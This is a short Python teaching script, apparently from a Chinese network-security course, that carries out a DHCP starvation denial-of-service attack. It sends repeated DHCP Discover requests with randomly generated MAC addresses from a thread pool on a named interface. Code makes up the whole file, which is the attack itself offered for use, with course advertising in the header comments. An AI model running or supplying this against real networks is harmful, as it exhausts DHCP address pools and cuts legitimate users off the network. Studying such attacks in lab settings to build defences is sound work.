#!/usr/bin/env python3
# -*- coding=utf-8 -*-
# 本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
# 教主QQ:605658506
# 亁颐堂官网www.qytang.com
# 教主技术进化论拓展你的技术新边疆
# https://ke.qq.com/course/271956?tuin=24199d8a

from multiprocessing.pool import ThreadPool
from Part1_Classic_Protocols.Tools.Random_MAC import Random_MAC
from DHCP_Discover import DHCP_Discover_Sendonly

pool = ThreadPool(processes=10)


def DHCP_Discover_DoS(ifname):
    i = 1
    while i < 300:
        MAC_ADD = Random_MAC()  # 随机产生MAC地址！
        print(MAC_ADD)  # 打印随机产生的MAC地址！
        # 如果希望慢一点,可以设置延时参数
        pool.apply_async(DHCP_Discover_Sendonly, args=(ifname, MAC_ADD, 0))
        i += 1
    pool.close()


if __name__ == '__main__':
    # 使用Linux解释器 & WIN解释器
    DHCP_Discover_DoS('ens33')
